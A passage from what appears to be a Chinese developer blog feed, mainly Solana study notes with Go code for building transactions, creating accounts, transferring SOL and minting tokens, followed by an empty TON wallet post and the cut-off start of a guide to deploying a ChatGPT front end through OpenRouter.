go"><br><br>solana1.jpg<br></code></pre></td></tr></table></figure><h1 id="额外笔记"><a href="#额外笔记" class="headerlink" title="额外笔记"></a>额外笔记</h1><h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><p>我们发送到 Solana 网络中的一笔交易包括四个部分：</p><ul><li>一个或多个指令 （<code>instructions</code>）</li><li>一个要读取或写入的账户数组 （<code>account_keys</code>）</li><li>一个或多个签名 （<code>signatures</code>）</li><li>最近的区块哈希 （<code>recent_blockhash</code>）</li></ul><p>一个<a href="https://solana.com/docs/terminology#instruction">指令</a>是 Solana 上最小的执行逻辑。指令指定了执行程序、涉及的所有账户和操作数据。指令调用程序更新状态（例如，调用代币程序将代币从你的帐户转移到另一个帐户），程序解释指令中的数据，并对指定账户进行操作</p><blockquote><p>指令—&gt;类似于以太坊智能合约上的函数调用</p></blockquote><h2 id="交易费—基础手续费-和-优先费"><a href="#交易费—基础手续费-和-优先费" class="headerlink" title="交易费—基础手续费 和 优先费"></a>交易费—基础手续费 和 优先费</h2><p>（<code>lamports_per_signature</code>），<strong>基础手续费</strong>目前设定为每个签名 0.000005 SOL（5k lamports），这是一次性的费用，以便获得使用网络资源的权利，无论实际使用多少资源来执行交易（或者交易是否执行），都需要预先支付给网络。50% 的费用支付给产生区块的验证节点，剩余的 50% 则被销毁。</p><p>如果想提高其交易的优先级【可选的费用】，它可以设置一个 “计算单元价格”。 这个价格与 <a href="https://solana.com/zh/docs/core/fees#compute-unit-limit">计算单元限制</a> 结合使用，用来确定交易的优先级费用。</p><p>默认的计算单元限制为 <a href="https://github.com/anza-xyz/agave/blob/b7bbe36918f23d98e2e73502e3c4cba78d395ba9/program-runtime/src/compute_budget_processor.rs#L18">每个指令 20 万 CU</a>， 如果计算量比较大，可以设置最大为 140 万 Cu。 Solana 交易会预先请求指定数量的计算单元（CUs），如果超出这个数量，交易将失败。</p><p>另外，Solana 交易还会收交易包大小的限制，Solana 网络遵循最大传输单元 (MTU) 大小为 1280 字节，这与 IPv6 MTU 大小约束一致，以确保通过 UDP 传输集群信息的快速和可靠性。在计算必要的标头（IPv6 的 40 字节和 8 字节的片段头）后，1232 字节仍然可用于数据包， 签名和消息的组合不能超过此限制。</p><blockquote><p> 以下官方视频介绍</p></blockquote><h1 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h1><p>sol Accounts 模型</p><p>Solana 上的宗旨是一切皆为帐户，类似Linux 的一切皆文件一样，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;<br>  &quot;key&quot;:number,// 视为区块链公共地址<br>  &quot;lamports&quot;:number, // 实际总余额 本地soltoken 的最小单位，1 lamports=0.0000000001sol<br>  &quot;data&quot;:Unit8Array,// 无符号整数存储的原始字节<br>  &quot;is_executable&quot;:boolean, // 是否为程序，如果为true 就是可执行程序，flase就是普通数据帐户<br>  &quot;ower&quot;:Publickey // 所有者，只有该帐户的所有者才可以更新该帐户内数据<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Programs"><a href="#Programs" class="headerlink" title="Programs"></a>Programs</h1><p>Programs 程序就是solana 上的智能合约Smart contracts on Solana</p><ul><li><p>程序是无状态的，只能读取和写入别人的帐户数据</p></li><li><p>必须是帐户所有者才能修改</p></li><li><p>程序运行指令</p></li><li><p>程序能发送指令给其他程序</p></li></ul><p>总结</p><ul><li>一切皆程序</li><li>所有帐户都持有SOL</li><li>帐户能存储任意数据</li><li>帐户也能存储<strong>可执行程序</strong></li><li>帐户也能床底到程序中并行执行</li></ul><h1 id="Programs-Instructions"><a href="#Programs-Instructions" class="headerlink" title="Programs Instructions"></a>Programs Instructions</h1><p>程序指令</p><p>原始模型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;<br>  <span class="hljs-string">&quot;program_id&quot;</span>:number,<span class="hljs-comment">// 指定程序的id,该指令用于的程序</span><br>  <span class="hljs-string">&quot;keys&quot;</span>:Array&lt;&#123; <span class="hljs-comment">// 设计指令的帐户，这里用了数组，说明是可以传递多个的</span><br>    <span class="hljs-string">&quot;key&quot;</span>:Publcky,<br>    <span class="hljs-string">&quot;is_mutable&quot;</span>:boolean,<br>    <span class="hljs-string">&quot;is_signer&quot;</span>:boolean,<br>  &#125;&gt;,<br>  <span class="hljs-string">&quot;data&quot;</span>:Unit8Array <span class="hljs-comment">//你有一定量的数据通过原始字节的形式发送到网络中</span><br>&#125;<br><br><br><span class="hljs-comment">// 下面是go中的</span><br><span class="hljs-keyword">type</span> Instruction <span class="hljs-keyword">struct</span> &#123;<br>ProgramID common.PublicKey<br>Accounts  []AccountMeta<br>Data      []<span class="hljs-type">byte</span><br>&#125;<br><br><span class="hljs-keyword">type</span> AccountMeta <span class="hljs-keyword">struct</span> &#123;<br>PubKey     common.PublicKey<br>IsSigner   <span class="hljs-type">bool</span><br>IsWritable <span class="hljs-type">bool</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="简单指令"><a href="#简单指令" class="headerlink" title="简单指令"></a>简单指令</h2><p>多个指令捆绑在一起，就可以组成一个交易</p><p>Transactions 交易</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">message := types.NewMessage(<br>   types.NewMessageParam&#123;<br>      FeePayer:        common.PublicKeyFromString(alice.PublicKey.String()),<br>      Instructions:    ins,<br>      RecentBlockhash: recentBlockhashResponse.Blockhash,<br>   &#125;)<br>tx, err := types.NewTransaction(types.NewTransactionParam&#123;<br>   Message: message,<br>   Signers: []types.Account&#123;alice&#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>创建帐户的指令</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateAccountSimpleTx</span><span class="hljs-params">()</span></span> &#123;<br>c := NewClient()<br>alice, err := types.AccountFromBase58(Piv)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;alice=%v\n&quot;</span>, alice.PublicKey.String())<br><span class="hljs-comment">// 查询下地址的当前余额</span><br>balances, err := c.GetBalance(context.Background(), alice.PublicKey.String())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;get balances err = %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;balances = %v\n&quot;</span>, balances)<br><span class="hljs-comment">// 2、组装交易</span><br><span class="hljs-comment">// 2.1 拿recentBlockhashResponse</span><br>recentBlockhashResponse, err := c.GetLatestBlockhash(context.Background())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to get recent blockhash, err: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;recentBlockhashResponse = %v\n&quot;</span>, recentBlockhashResponse)<br><br><span class="hljs-comment">// 最小转账金额</span><br>minimumBalanceForRentExemption, err := c.GetMinimumBalanceForRentExemption(context.Background(), <span class="hljs-number">0</span>)<br>fmt.Printf(<span class="hljs-string">&quot;minimumBalanceForRentExemption = %v\n&quot;</span>, minimumBalanceForRentExemption)<br><span class="hljs-comment">// 2.2 定义Instruction然后填充它</span><br>ins := <span class="hljs-built_in">make</span>([]types.Instruction, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)<br><span class="hljs-comment">// 交易分成2个大部份 Transactions 和 Instructions 指令，Instructions可以有多个</span><br><span class="hljs-comment">// 追加优先费</span><br>ComputerUnitPrice := <span class="hljs-type">uint64</span>(<span class="hljs-number">200000</span>) <span class="hljs-comment">//一个计算单元的价格</span><br>ComputerUnitLimit := <span class="hljs-type">uint32</span>(<span class="hljs-number">200000</span>) <span class="hljs-comment">//计算单元的限制</span><br>ins = <span class="hljs-built_in">append</span>(ins, compute_budget.SetComputeUnitPrice(compute_budget.SetComputeUnitPriceParam&#123;<br>MicroLamports: ComputerUnitPrice,<br>&#125;))<br><br>ins = <span class="hljs-built_in">append</span>(ins, compute_budget.SetComputeUnitLimit(compute_budget.SetComputeUnitLimitParam&#123;<br>Units: ComputerUnitLimit,<br>&#125;))<br><br><span class="hljs-comment">// DOINGS 我在做的事情是创建一个地址并为其在链上创建一个账号,参考createAccount方法</span><br><span class="hljs-comment">// 生成一个钱包，先不管他的地址</span><br>bob := types.NewAccount()<br>fmt.Printf(<span class="hljs-string">&quot;bob address=%s\n&quot;</span>, bob.PublicKey.String())<br><span class="hljs-comment">// 指令三纬度，ProgramId 、 Accounts、Data</span><br>Accounts := []types.AccountMeta&#123;<br>&#123;PubKey: common.PublicKeyFromString(alice.PublicKey.String()), IsSigner: <span class="hljs-literal">true</span>, IsWritable: <span class="hljs-literal">true</span>&#125;,<br>&#123;PubKey: common.PublicKeyFromString(bob.PublicKey.String()), IsSigner: <span class="hljs-literal">true</span>, IsWritable: <span class="hljs-literal">true</span>&#125;,<br>&#125;<br>data, err := bincode.SerializeData(<span class="hljs-keyword">struct</span> &#123;<br>Instruction system.Instruction<br>Lamports    <span class="hljs-type">uint64</span><br>Space       <span class="hljs-type">uint64</span><br>Owner       common.PublicKey<br>&#125;&#123;<br>Instruction: system.InstructionCreateAccount,<br>Lamports:    minimumBalanceForRentExemption + <span class="hljs-number">1</span>,<br><span class="hljs-comment">//Space:       system.NonceAccountSize,</span><br>Space: <span class="hljs-number">0</span>,<br>Owner: common.SystemProgramID,<br>&#125;)<br>createAccountIns := types.Instruction&#123;<br>ProgramID: common.SystemProgramID,<br>Accounts:  Accounts,<br><span class="hljs-comment">//Data:      []byte&#123;0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 200, 0, 0, 0, 0, 0, 0, 0, 6, 161, 216, 23, 145, 55, 84, 42, 152, 52, 55, 189, 254, 42, 122, 178, 85, 127, 83, 92, 138, 120, 114, 43, 104, 164, 157, 192, 0, 0, 0, 0&#125;,</span><br>Data: data,<br>&#125;<br>ins = <span class="hljs-built_in">append</span>(ins, createAccountIns)<br><span class="hljs-comment">// 消息包含指令、区块哈希、fee支付者</span><br>message := types.NewMessage(<br>types.NewMessageParam&#123;<br>FeePayer: alice.PublicKey,<br>Instructions:    ins,<br>RecentBlockhash: recentBlockhashResponse.Blockhash,<br>&#125;)<br><span class="hljs-comment">// 交易包含签名和消息</span><br>tx, err := types.NewTransaction(types.NewTransactionParam&#123;<br>Message: message,<br>Signers: []types.Account&#123;alice, bob&#125;,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to new transaction, err: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 3、广播上链</span><br>txhash, err := c.SendTransaction(context.Background(), tx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to SendTransaction, err: %v&quot;</span>, err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;tx hash&quot;</span>, txhash)<br>&#125;<br><br><span class="hljs-comment">// 下面是使用sdk自带的方法</span><br>bob := types.NewAccount()<br>fmt.Printf(<span class="hljs-string">&quot;bob address=%s\n&quot;</span>, bob.PublicKey.String())<br><br>createAccountIns2 := system.CreateAccount(system.CreateAccountParam&#123;<br>From:     alice.PublicKey,<br>New:      bob.PublicKey,<br>Owner:    common.SystemProgramID, <span class="hljs-comment">// 你要为他创建哪个帐户就用哪个owner</span><br>Lamports: minimumBalanceForRentExemption + <span class="hljs-number">1</span>, <span class="hljs-comment">// 最低租金+1</span><br>Space:    <span class="hljs-number">0</span>,<br>&#125;)<br>ins = <span class="hljs-built_in">append</span>(ins, createAccountIns2)<br></code></pre></td></tr></table></figure><p>总结</p><ul><li>程序调用指令</li><li>指令通过交易发送广播出去</li><li>交易需要是原子的</li><li>所有交易都必须签名</li></ul><p>Solana 交易的生命周期—-&gt;不单单是solana 很多题目都会出现</p><ul><li>指令包含什么：程序id、 帐户key数组 、data</li><li>交易包含什么：指令、RecentBlockhash、签名消息、fee支付者</li><li>去中心化应用DAPP 客户端 组装交易（指令），</li><li>交易被发送到RPC 客户端 </li><li>RPC客户端把所有交易转发给投票验证者</li><li>验证者将实际使用solana运行时来启用，运行时实际执行每个交易内的每个指令</li><li>每个指令将调用一个特定程序来实际执行该程序代码试图做的事情，这个程序只是增加一个计数器并递增1</li></ul><h2 id="复杂指令"><a href="#复杂指令" class="headerlink" title="复杂指令"></a>复杂指令</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateComplexTx</span><span class="hljs-params">()</span></span> &#123;<br><br>c := NewClient()<br>alice, err := types.AccountFromBase58(Piv)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;alice=%v\n&quot;</span>, alice.PublicKey.String())<br><span class="hljs-comment">// 查询下地址的当前余额</span><br>balances, err := c.GetBalance(context.Background(), alice.PublicKey.String())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;get balances err = %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;balances = %v\n&quot;</span>, balances)<br><span class="hljs-comment">// 2、组装交易</span><br><span class="hljs-comment">// 2.1 拿recentBlockhashResponse</span><br>recentBlockhashResponse, err := c.GetLatestBlockhash(context.Background())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to get recent blockhash, err: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// 最小转账金额</span><br>minimumBalanceForRentExemption, err := c.GetMinimumBalanceForRentExemption(context.Background(), <span class="hljs-number">0</span>)<br>fmt.Printf(<span class="hljs-string">&quot;minimumBalanceForRentExemption = %v\n&quot;</span>, minimumBalanceForRentExemption)<br><span class="hljs-comment">// 2.2 定义Instruction然后填充它</span><br>ins := <span class="hljs-built_in">make</span>([]types.Instruction, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>)<br><span class="hljs-comment">// 交易分成2个大部份 Transactions 和 Instructions 指令，Instructions可以有多个</span><br><span class="hljs-comment">// 追加优先费</span><br>ComputerUnitPrice := <span class="hljs-type">uint64</span>(<span class="hljs-number">2000000</span>) <span class="hljs-comment">//一个计算单元的价格</span><br>ComputerUnitLimit := <span class="hljs-type">uint32</span>(<span class="hljs-number">2000000</span>) <span class="hljs-comment">//计算单元的限制</span><br>ins = <span class="hljs-built_in">append</span>(ins, compute_budget.SetComputeUnitPrice(compute_budget.SetComputeUnitPriceParam&#123;<br>MicroLamports: ComputerUnitPrice,<br>&#125;))<br><br>ins = <span class="hljs-built_in">append</span>(ins, compute_budget.SetComputeUnitLimit(compute_budget.SetComputeUnitLimitParam&#123;<br>Units: ComputerUnitLimit,<br>&#125;))<br><br><span class="hljs-comment">// DOINGS 我在做的事情是创建一个地址并为其在链上创建一个账号,参考createAccount方法</span><br><span class="hljs-comment">// 创建测试帐户指令，生成一个钱包，先不管他的地址</span><br>bob := types.NewAccount()<br>fmt.Printf(<span class="hljs-string">&quot;bob address=%s\n&quot;</span>, bob.PublicKey.String())<br>createAccountIns2 := system.CreateAccount(system.CreateAccountParam&#123;<br>From:     alice.PublicKey,<br>New:      bob.PublicKey,<br>Owner:    common.SystemProgramID,<br>Lamports: minimumBalanceForRentExemption + <span class="hljs-number">1</span>,<br>Space:    <span class="hljs-number">0</span>,<br>&#125;)<br>ins = <span class="hljs-built_in">append</span>(ins, createAccountIns2)<br><span class="hljs-comment">// 第二个指令，给静态地址转账</span><br>Cindy := common.PublicKeyFromString(<span class="hljs-string">&quot;2e7MJy7rh3mr7myjEtyD6Bjyyc9fYcYVwwhGhgVDbx5U&quot;</span>) <span class="hljs-comment">// 随便一个静态地址</span><br>ins = <span class="hljs-built_in">append</span>(ins, system.Transfer(system.TransferParam&#123;<br>From:   alice.PublicKey,<br>To:     Cindy,<br>Amount: <span class="hljs-number">100000000</span>,<br>&#125;))<br><span class="hljs-comment">// 第三个指令，给测试帐户转账</span><br>ins = <span class="hljs-built_in">append</span>(ins, system.Transfer(system.TransferParam&#123;<br>From:   alice.PublicKey,<br>To:     bob.PublicKey,<br>Amount: <span class="hljs-number">200000000</span>,<br>&#125;))<br><span class="hljs-comment">// 第四个指令，给静态地址转账</span><br>ins = <span class="hljs-built_in">append</span>(ins, system.Transfer(system.TransferParam&#123;<br>From:   alice.PublicKey,<br>To:     Cindy,<br>Amount: <span class="hljs-number">300000000</span>,<br>&#125;))<br><span class="hljs-comment">// 消息包含指令、区块哈希、fee支付者</span><br>message := types.NewMessage(<br>types.NewMessageParam&#123;<br>FeePayer: alice.PublicKey,<br>Instructions:    ins,<br>RecentBlockhash: recentBlockhashResponse.Blockhash,<br>&#125;)<br><span class="hljs-comment">// 交易包含签名和消息</span><br>tx, err := types.NewTransaction(types.NewTransactionParam&#123;<br>Message: message,<br>Signers: []types.Account&#123;alice, bob&#125;,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to new transaction, err: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 3、广播上链</span><br>txhash, err := c.SendTransaction(context.Background(), tx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to SendTransaction, err: %v&quot;</span>, err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;tx hash&quot;</span>, txhash)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="TOKEN-指令–-创建Token和元数据"><a href="#TOKEN-指令–-创建Token和元数据" class="headerlink" title="TOKEN 指令–&gt;创建Token和元数据"></a>TOKEN 指令–&gt;创建Token和元数据</h2><p>createTokenWithMetadata</p><p>分成4个步骤</p><ol><li>Create a new account 创建一个新帐户，</li><li>Initialize that account as a mint  初始化这个帐户为铸造方</li><li>Create an associated token account  创建关联代币帐户 ATA</li><li>Mint new tokens to that associated token account 将新代币铸造到关联的代币账户</li></ol><p>我们先完成前面3个步骤来创建token和元数据，3个指令</p><p>createMintAccountInstruction,</p><p> initializeMintInstruction,</p><p>createMetadataInstruction,</p><p>见代码  </p><p>第四步就是mint to 铸造一定数量的token发送给某个接收者地址</p><p>见代码</p><h2 id="更改代币元数据"><a href="#更改代币元数据" class="headerlink" title="更改代币元数据"></a>更改代币元数据</h2><p>见代码</p><p>总结铸造流程：</p><ol><li>创建一个帐户,<code>system.CreateAccount()方法</code></li><li>为帐户初始化为一个铸币帐户Mint <code>token.InitializeMint()方法</code></li><li>为该帐户初始名称并创建元数据帐户地址(PDA派生那一步),<code>common.FindProgramAddress()加上token_metadata.CreateMetadataAccountV3()方法</code></li><li>create an associated token account for the user’s wallet为用户的钱包创建关联的代币账户 ·<code>associated_token_account.Create()方法</code></li><li>mint a token to the user’s associated token account向用户关联的代币账户铸造代币 <code>token.MintTo()方法</code></li></ol><h1 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h1><p>NFT就是一个splat Token 是一个具有独特属性的非同质化代币</p><p>特性</p><ol><li>Are SPL Tokens 是token</li><li>小数精度为0</li><li>总供应量为1</li><li>高度可定制的元数据如图像等各种属性</li></ol><p>还有两个概念，主板和集合</p><h1 id="调用合约"><a href="#调用合约" class="headerlink" title="调用合约"></a>调用合约</h1><p>参考交易<a href="https://solscan.io/tx/4kEqM9WYQnud3G2UjiNgRktQKGkRu3B4PSuLepSrqYubU3Ha5J88PGmWNnt85MKwDuCyrc2q5odU8nWRNnUFVtNw?cluster=devnet">https://solscan.io/tx/4kEqM9WYQnud3G2UjiNgRktQKGkRu3B4PSuLepSrqYubU3Ha5J88PGmWNnt85MKwDuCyrc2q5odU8nWRNnUFVtNw?cluster=devnet</a></p><p>创建池子的交易:</p><p><a href="https://solscan.io/tx/4kEqM9WYQnud3G2UjiNgRktQKGkRu3B4PSuLepSrqYubU3Ha5J88PGmWNnt85MKwDuCyrc2q5odU8nWRNnUFVtNw?cluster=devnet">https://solscan.io/tx/4kEqM9WYQnud3G2UjiNgRktQKGkRu3B4PSuLepSrqYubU3Ha5J88PGmWNnt85MKwDuCyrc2q5odU8nWRNnUFVtNw?cluster=devnet</a></p><p>3aPmA4hTkMQMFfF5cpktFSK6rniJHoL2DdmqVi1q3SoLTNXzisK4FiW6XJcD1tftygq9n1vMyjBLBrP6gymWapeK</p><ul><li>得到的代币可容忍的数量差，超出容忍度，超出</li><li></li></ul><p>AMM</p><p>CLMM</p><p>CPMM </p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-4TON钱包开发流程</title>
    <link href="/2024/11/19/07-4TON%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/11/19/07-4TON%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="一-TON简介"><a href="#一-TON简介" class="headerlink" title="一 TON简介"></a>一 TON简介</h1><h1 id="二-离线地址生成"><a href="#二-离线地址生成" class="headerlink" title="二 离线地址生成"></a>二 离线地址生成</h1><h1 id="三-离线签名"><a href="#三-离线签名" class="headerlink" title="三 离线签名"></a>三 离线签名</h1><h1 id="四-TON钱包开发中的API"><a href="#四-TON钱包开发中的API" class="headerlink" title="四 TON钱包开发中的API"></a>四 TON钱包开发中的API</h1><h1 id="五-中心化钱包开发"><a href="#五-中心化钱包开发" class="headerlink" title="五 中心化钱包开发"></a>五 中心化钱包开发</h1><h1 id="六、去中心化钱包开发-HD钱包"><a href="#六、去中心化钱包开发-HD钱包" class="headerlink" title="六、去中心化钱包开发 HD钱包"></a>六、去中心化钱包开发 HD钱包</h1><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><h1 id="八、附件"><a href="#八、附件" class="headerlink" title="八、附件"></a>八、附件</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不写代码不用国外手机号一键部署自己的ChatGPT</title>
    <link href="/2024/08/11/903PrivateGPT/"/>
    <url>/2024/08/11/903PrivateGPT/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>不写一行代码不用国外手机号国外银行卡一键部署你自己的ChatGPT</strong></p><blockquote><p>Gpt-4,Gpt-4o,Gpt-4-Turbo,Gpt-4o-mini,Gemma,Claude,Llama,Qwen都可用</p></blockquote><h2 id="什么是gpt？"><a href="#什么是gpt？" class="headerlink" title="什么是gpt？"></a>什么是gpt？</h2><p>出门右拐</p><h2 id="我需要准备什么？"><a href="#我需要准备什么？" class="headerlink" title="我需要准备什么？"></a>我需要准备什么？</h2><ul><li>账号：<ul><li>一个邮箱（必备，最好google）</li><li>GitHub 账号（可选）</li></ul></li><li>支付方式：<ul><li>支付宝</li><li>国内银行卡</li><li>ETH支付</li><li>Visa信用卡支付（可选）</li><li>其他支付。。。。</li></ul></li></ul><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="/img/pic/MyChat.jpg" alt="流程图"></p><h1 id="用什么支付？"><a href="#用什么支付？" class="headerlink" title="用什么支付？"></a>用什么支付？</h1><p>推荐国内银行卡、支付宝、Base_ETH；</p><h1 id="支付给谁？"><a href="#支付给谁？" class="headerlink" title="支付给谁？"></a>支付给谁？</h1><p><a href="https://openrouter.ai/">https://openrouter.ai/</a>  是一家全球最大的承包服务商，可以提供ChatGPT、Gemini、Claude 等对话服务和API Key</p><h2 id="登录"><a href="#登录" 